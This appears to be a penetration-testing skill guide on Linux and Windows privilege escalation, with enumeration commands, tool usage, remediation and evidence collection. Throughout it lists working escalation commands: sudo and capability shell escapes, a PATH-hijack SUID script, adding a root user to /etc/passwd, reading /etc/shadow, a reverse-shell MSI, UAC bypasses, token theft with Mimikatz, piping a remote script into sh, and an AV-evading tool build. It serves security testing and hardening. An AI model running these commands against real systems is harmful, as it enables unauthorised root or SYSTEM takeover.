# Privilege Escalation Testing

## Overview
Privilege escalation is the act of exploiting a vulnerability, misconfiguration, or design flaw to gain elevated access to resources that are normally protected. It is divided into vertical escalation (gaining higher privileges, e.g., user to root/SYSTEM) and horizontal escalation (accessing another user's resources at the same privilege level). This skill covers both Linux and Windows escalation vectors.

## Classification
- **CWE:** CWE-269 (Improper Privilege Management), CWE-250 (Execution with Unnecessary Privileges), CWE-732 (Incorrect Permission Assignment)
- **MITRE ATT&CK:** T1548 (Abuse Elevation Control Mechanism), T1068 (Exploitation for Privilege Escalation), T1053 (Scheduled Task/Job), T1574 (Hijack Execution Flow)
- **CVSS Base:** 7.0 - 9.8 (High to Critical)
- **OWASP:** Related to broken access control categories

## Detection Methodology -- Linux

### 1. SUID/SGID Binaries
Find binaries with the SUID/SGID bit set that may allow escalation:
```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find SUID binaries owned by root
find / -perm -4000 -user root -type f 2>/dev/null

# Cross-reference with GTFOBins for exploitable binaries
# Common exploitable SUID: nmap, vim, find, bash, more, less, nano, cp, mv, python, perl, ruby
```

### 2. Sudo Misconfigurations
```bash
# Check sudo permissions
sudo -l

# Exploitable sudo entries:
# (ALL) NOPASSWD: /usr/bin/vim     -> sudo vim -c '!sh'
# (ALL) NOPASSWD: /usr/bin/find    -> sudo find . -exec /bin/sh \;
# (ALL) NOPASSWD: /usr/bin/python3 -> sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
# (ALL) NOPASSWD: /usr/bin/env     -> sudo env /bin/sh
# (ALL) NOPASSWD: /usr/bin/awk     -> sudo awk 'BEGIN {system_call("/bin/sh")}'

# LD_PRELOAD exploitation (if env_keep+=LD_PRELOAD in sudoers)
# Compile shared library that spawns shell, load via sudo
```

### 3. Kernel Exploits
```bash
# Check kernel version
uname -a
cat /proc/version
cat /etc/os-release

# Common kernel exploits:
# DirtyPipe (CVE-2022-0847) - Linux 5.8+
# DirtyCow (CVE-2016-5195) - Linux 2.6.22 to 4.8.3
# PwnKit (CVE-2021-4034) - polkit pkexec
# Baron Samedit (CVE-2021-3156) - sudo heap overflow
# Looney Tunables (CVE-2023-4911) - glibc ld.so
```

### 4. Linux Capabilities
```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Exploitable capabilities:
# cap_setuid+ep on python3 -> python3 -c 'import posix; posix.setuid(0); posix.execvp("/bin/bash", ["/bin/bash"])'
# cap_dac_read_search on tar -> tar czf /tmp/shadow.tar.gz /etc/shadow
# cap_net_raw on tcpdump -> packet capture without root
# cap_setuid+ep on perl -> perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'
```

### 5. Cron Job Exploitation
```bash
# Enumerate cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*

# Look for writable scripts executed by cron
# Look for wildcard injection in cron commands
# Look for missing absolute paths in cron scripts
# Check PATH variable in crontab for path injection
```

### 6. PATH Hijacking
```bash
# Check if any SUID binary or cron job calls commands without absolute path
strings /usr/local/bin/suid-binary | grep -v "^/"

# Create malicious binary in writable PATH directory
echo '#!/bin/bash' > /tmp/ps
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
```

### 7. Writable Files and Directories
```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Writable /etc/passwd (add root-level user)
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd

# Writable systemd service files
find /etc/systemd /lib/systemd -writable -type f 2>/dev/null

# Writable Docker socket
ls -la /var/run/docker.sock
```

## Detection Methodology -- Windows

### 8. SeImpersonatePrivilege / Potato Attacks
```cmd
# Check current privileges
whoami /priv

# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is enabled:
# Use JuicyPotato, PrintSpoofer, GodPotato, SweetPotato, RoguePotato

# PrintSpoofer (Windows 10/Server 2016+)
PrintSpoofer.exe -i -c cmd

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato (older Windows)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
```

### 9. Service Misconfigurations
```cmd
# Find services with weak permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Writable service binary paths
icacls "C:\Program Files\VulnService\service.exe"

# Modify service binary path
sc config VulnService binpath= "C:\temp\reverse.exe"
sc stop VulnService
sc start VulnService

# DLL hijacking in service directories
# Place malicious DLL in application directory that is searched before system directories
```

### 10. Registry-Based Escalation
```cmd
# AlwaysInstallElevated (install MSI as SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both are 1: msfvenom -p windows/shell_reverse_tcp -f msi -o evil.msi

# AutoRun programs with weak permissions
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Saved credentials in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### 11. UAC Bypass
```cmd
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# Fodhelper bypass (Windows 10)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe

# Eventvwr bypass
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe

# UACME project -- 70+ bypass methods
```

### 12. Token Impersonation
```cmd
# Using Incognito (Metasploit)
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"

# Using tokenvator
Tokenvator.exe list
Tokenvator.exe steal /pid:1234

# Mimikatz token manipulation
mimikatz# token::elevate
mimikatz# token::list
```

## Tool Usage

### LinPEAS (Linux Privilege Escalation Awesome Scripts)
```bash
# Download and run
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Run with output to file
./linpeas.sh -a > linpeas_output.txt 2>&1

# Run specific checks only
./linpeas.sh -s        # Superfast (only critical checks)
./linpeas.sh -e        # Extra enumeration
```

### WinPEAS (Windows Privilege Escalation Awesome Scripts)
```cmd
# Run with all checks
winPEASany.exe -a > winpeas_output.txt

# Run specific checks
winPEASany.exe servicesinfo
winPEASany.exe userinfo
winPEASany.exe systeminfo

# Obfuscated version to bypass AV
winPEASany_ofs.exe
```

### linux-exploit-suggester
```bash
# Run exploit suggester
./linux-exploit-suggester.sh

# With specific kernel version
./linux-exploit-suggester.sh --kernel 5.4.0

# linux-exploit-suggester-2 (Python)
python linux-exploit-suggester-2.py
```

### Windows Exploit Suggester
```cmd
# Gather system info
systeminfo > systeminfo.txt

# Run suggester (on attacker machine)
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt

# wesng (Windows Exploit Suggester - Next Generation)
python wes.py systeminfo.txt
```

### PowerUp (PowerShell)
```powershell
# Import and run all checks
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Specific checks
Get-UnquotedService
Get-ModifiableServiceFile
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
```

### BeRoot
```bash
# Linux
python beroot.py

# Windows
beRoot.exe
```

## Remediation
1. **Principle of least privilege** -- assign minimum necessary permissions to users and services
2. **Remove unnecessary SUID/SGID bits** -- audit and minimize SUID/SGID binaries
3. **Restrict sudo access** -- use specific commands, avoid NOPASSWD where possible
4. **Patch management** -- keep kernel and system packages updated
5. **Audit cron jobs** -- use absolute paths, restrict file permissions on scripts
6. **Service hardening** -- use strong ACLs, quote service paths, run as dedicated accounts
7. **UAC enforcement** -- set UAC to "Always Notify" level
8. **Credential hygiene** -- do not store plaintext credentials in registry or files
9. **Remove unnecessary privileges** -- revoke SeImpersonatePrivilege from non-service accounts
10. **File integrity monitoring** -- detect unauthorized changes to system binaries and configs

## Evidence Collection
When documenting privilege escalation findings:
- Initial access level and final escalated level (e.g., www-data to root)
- Exact vulnerability or misconfiguration exploited
- Commands executed and their output at each stage
- Kernel version or service version affected
- Screenshot of escalated shell showing whoami/id output
- LinPEAS/WinPEAS output highlighting the exploited vector
- Impact assessment and affected systems count
- Time from initial access to escalation
